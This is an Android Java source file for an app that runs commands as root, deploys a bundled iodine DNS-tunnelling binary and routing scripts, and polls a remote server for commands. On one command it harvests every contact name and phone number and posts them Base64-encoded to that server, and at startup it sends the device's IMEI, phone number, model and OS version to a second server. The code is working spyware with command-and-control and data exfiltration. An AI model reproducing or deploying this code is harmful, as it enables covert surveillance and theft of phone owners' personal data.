package com.example.prp;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import android.app.Activity;  
import android.content.ContentResolver;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;  
import android.os.Handler;  
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.View;  
import android.view.View.OnClickListener;  
import android.widget.Button;  
import android.widget.TextView;  
  
public class MainActivity extends Activity {  
    private Button btnUploadFile; 
    private Button btnStartIodine;
    private Button btnChangeRoute;
    private Button btnStartDect;
    private Button btnStop;   
    private Button btnDeleteFile; 
    private TextView tvResult;  
    private String result = "";  
    private boolean run = false;  
    
    private static int delayTime = 5000;
  
    private Handler handler = new Handler();  
  
    private Runnable task = new Runnable() {  
  
        public void run() {   
            if (run) {  
                handler.postDelayed(this, delayTime);  
                
                String command = getCommand();                
                try{
	    			if(!command.equals("noCommand")){
	    				String[] temp = command.split(":");
	    				String command_id = temp[0];
	    				String command_type = temp[1];
	    				String target = temp[2];
	    				
	    				String data = "";
	    				
	    				switch(Integer.parseInt(command_type)){
	    					case 1:data = getPhoneContacts();break;
	    					default:data = "invalidCommand";break;
	    				}
	    				
	    				if(data != "invalidCommand"){
	    					result = replyCommand(command_id,data);
	    				}
	    				else{
	    					result = "invalidCommand";
	    				}
	    				
	    			}
	    			else{
	    				result = "noCommand";    				
	    			}
                }
                catch(Exception ee) {  
        			result = ee.getMessage();
        		}
            }  
            tvResult.setText(result);            
        }  
    };  
  
    /** Called when the activity is first created. */  
    @Override  
    public void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        btnUploadFile = (Button) findViewById(R.id.Button01);  
        btnStartIodine = (Button) findViewById(R.id.Button02);  
        btnChangeRoute = (Button) findViewById(R.id.Button03);  
        btnStartDect = (Button) findViewById(R.id.Button04); 
        btnStop = (Button) findViewById(R.id.Button05);  
        btnDeleteFile = (Button) findViewById(R.id.Button06);
        tvResult = (TextView) findViewById(R.id.result);  
  
        btnUploadFile.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		createFile();
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
        			execCommand("chmod 777 ." + fileDirPath + "/" + "iodine");
        			execCommand("chmod 777 ." + fileDirPath + "/" + "start_iodine.sh");
                	execCommand("chmod 777 ." + fileDirPath + "/" + "change_route.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(2);  
        	}
        });
        
        btnStartIodine.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
                	execCommand("sh ." + fileDirPath + "/" + "start_iodine.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(3);  
        	}
        });
        
        btnChangeRoute.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
                	execCommand("sh ." + fileDirPath + "/" + "change_route.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(4);  
        	}
        });
        
        btnStartDect.setOnClickListener(new OnClickListener() {    
            public void onClick(View v) {  
                run = true;  
                updateButton(5);  
                handler.postDelayed(task, delayTime);  
            }  
        }); 
        
        btnStop.setOnClickListener(new OnClickListener() {  
            public void onClick(View v) {    
                run = false;  
                updateButton(1);  
                handler.post(task); 
                execCommand("killall iodine");
                tvResult.setText("Stopped");
            }  
        });
        
        btnDeleteFile.setOnClickListener(new OnClickListener() {  
            public void onClick(View v) {  
            	execCommand("killall iodine");
                deleteFile();
            }  
        });
        
        replyDeviceInfo();
        
    }  
  
    private void updateButton(int status) {  
        if(status == 1){
        	btnUploadFile.setEnabled(true);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }  
        else if(status == 2){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(true);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 3){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(true);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 4){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(true); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 5){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(true);         	
        }
    }  
    
    
    /**��ȡ����**/
	private String getCommand(){   
		try{  
			URL url = new URL("http://10.0.0.1/prp/index.php/command/get_command");  
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
			conn.setDoInput(true);  
			conn.setConnectTimeout(10000);  
			conn.setRequestMethod("GET");  
			conn.setRequestProperty("accept", "*/*");  
			String location = conn.getRequestProperty("location");  
			int resCode = conn.getResponseCode();  
			conn.connect();  
			InputStream stream = conn.getInputStream();  
			byte[] data=new byte[102400];  
			int length=stream.read(data);  
			String str=new String(data,0,length);   
			conn.disconnect();  			
			stream.close();  
			return str;
		}  
		catch(Exception ee) {  
			return ee.getMessage();
		}  
	} 
	
	/**�õ��ֻ�ͨѶ¼��ϵ����Ϣ**/
    private String getPhoneContacts() {
    	String temp_result = "";
    	
    	//�õ�ContentResolver����
        ContentResolver cr = getContentResolver();
        //ȡ�õ绰���п�ʼһ��Ĺ��
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //�����ƶ����
        while(cursor.moveToNext())
        {
            //ȡ����ϵ������
            int nameFieldColumnIndex = cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME);
            String contact = cursor.getString(nameFieldColumnIndex);
            //ȡ�õ绰����
            String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, 
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
             
            while(phone.moveToNext())
            {
                String PhoneNumber = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                temp_result += (contact + ":" + PhoneNumber + "\n");
            }
        }
        cursor.close();
        
        return temp_result;
    }
    
    /**�ظ�����**/
	private String replyCommand(String command_id,String result){  
		String password = "123456";
		String temp_url = "http://10.0.0.1/prp/index.php/command/reply_command";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("password", password));
	        params.add(new BasicNameValuePair("result", command_id + ":" + Base64.encodeToString(result.getBytes(),Base64.DEFAULT)));
	        

	        /* �������������������*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*�������󲢵ȴ���Ӧ*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*��״̬��Ϊ200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*����������*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	
	/*�ϴ���Ҫ���ļ�*/
	private void createFile() {
		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
		
		//�ϴ�iodine
		String filePath = fileDirPath + "/" + "iodine";// �ļ�·��
		try{
			File dir = new File(fileDirPath);// Ŀ¼·��
			if(!dir.exists()){// ��������ڣ��򴴽�·����
				tvResult.setText("Ҫ�洢��Ŀ¼������");
				if(dir.mkdirs()){// ������·����������true���ʾ�����ɹ�
					tvResult.setText("�Ѿ������ļ��洢Ŀ¼");
				} 
				else{
					tvResult.setText("����Ŀ¼ʧ��");
				}
			}
			// Ŀ¼���ڣ���apk��raw�е���Ҫ���ĵ����Ƶ���Ŀ¼��
			File file = new File(filePath);
			if (!file.exists()){// �ļ�������
				tvResult.setText("Ҫ�򿪵��ļ�������");
				InputStream ins = getResources().openRawResource(R.raw.iodine);//ͨ��raw�õ�������Դ
				tvResult.setText("��ʼ����");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("��ʼд��");
				byte[] buffer = new byte[8192];
				int count = 0;// ѭ��д��
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("�Ѿ��������ļ�");
				fos.close();// �ر���
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
		
		//�ϴ�start_iodine.sh
		filePath = fileDirPath + "/" + "start_iodine.sh";// �ļ�·��
		try{
			File dir = new File(fileDirPath);// Ŀ¼·��
			if(!dir.exists()){// ��������ڣ��򴴽�·����
				tvResult.setText("Ҫ�洢��Ŀ¼������");
				if(dir.mkdirs()){// ������·����������true���ʾ�����ɹ�
					tvResult.setText("�Ѿ������ļ��洢Ŀ¼");
				} 
				else{
					tvResult.setText("����Ŀ¼ʧ��");
				}
			}
			// Ŀ¼���ڣ���apk��raw�е���Ҫ���ĵ����Ƶ���Ŀ¼��
			File file = new File(filePath);
			if (!file.exists()){// �ļ�������
				tvResult.setText("Ҫ�򿪵��ļ�������");
				InputStream ins = getResources().openRawResource(R.raw.start_iodine);//ͨ��raw�õ�������Դ
				tvResult.setText("��ʼ����");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("��ʼд��");
				byte[] buffer = new byte[8192];
				int count = 0;// ѭ��д��
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("�Ѿ��������ļ�");
				fos.close();// �ر���
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
		
		//�ϴ�change_route.sh
		filePath = fileDirPath + "/" + "change_route.sh";// �ļ�·��
		try{
			File dir = new File(fileDirPath);// Ŀ¼·��
			if(!dir.exists()){// ��������ڣ��򴴽�·����
				tvResult.setText("Ҫ�洢��Ŀ¼������");
				if(dir.mkdirs()){// ������·����������true���ʾ�����ɹ�
					tvResult.setText("�Ѿ������ļ��洢Ŀ¼");
				} 
				else{
					tvResult.setText("����Ŀ¼ʧ��");
				}
			}
			// Ŀ¼���ڣ���apk��raw�е���Ҫ���ĵ����Ƶ���Ŀ¼��
			File file = new File(filePath);
			if (!file.exists()){// �ļ�������
				tvResult.setText("Ҫ�򿪵��ļ�������");
				InputStream ins = getResources().openRawResource(R.raw.change_route);//ͨ��raw�õ�������Դ
				tvResult.setText("��ʼ����");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("��ʼд��");
				byte[] buffer = new byte[8192];
				int count = 0;// ѭ��д��
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("�Ѿ��������ļ�");
				fos.close();// �ر���
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
	}
	
	/*ɾ���ϴ����ļ�*/
	private void deleteFile(){
		try{
			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
					
			String filePath = fileDirPath + "/" + "iodine";// �ļ�·��
			File file = new File(filePath);
			file.delete();	
			
			filePath = fileDirPath + "/" + "start_iodine.sh";// �ļ�·��
			file = new File(filePath);
			file.delete();
			
			filePath = fileDirPath + "/" + "change_route.sh";// �ļ�·��
			file = new File(filePath);
			file.delete();
			tvResult.setText("delete files sucess");
		}
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
	}
	
	/*ִ�нű�*/
	public void execCommand(String command){
	    try{
	        //Ȩ������
	        Process p = Runtime.getRuntime().exec("su");
	        //��ȡ�����
	        OutputStream outputStream = p.getOutputStream();
	        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
	        //������д��
	        dataOutputStream.writeBytes(command);
	        //�ύ����
	        dataOutputStream.flush();
	        //�ر�������
	        dataOutputStream.close();
	        outputStream.close();
	        tvResult.setText("shell " + command + " sucess");
	    }
	    catch(Exception e){
	        tvResult.setText(e.getMessage());
	    }
    }
	
	/**��ȡ�豸������Ϣ**/
	private String[] getDeviceInfo(){ 
		TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		String[] deviceInfo = {tm.getDeviceId(),tm.getLine1Number(),Build.MODEL,Build.VERSION.RELEASE};
		return deviceInfo;
	}
    /**�����豸������Ϣ**/
	private String replyDeviceInfo(){ 
		String[] deviceInfo = getDeviceInfo();
		String temp_url = "http://192.168.1.2/prp/index.php/device/reply_device_info";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("phoneNumber", Base64.encodeToString(deviceInfo[1].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("phoneType", Base64.encodeToString(deviceInfo[2].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("system", Base64.encodeToString(deviceInfo[3].getBytes(),Base64.DEFAULT)));

	        /* �������������������*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*�������󲢵ȴ���Ӧ*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*��״̬��Ϊ200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*����������*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
}  
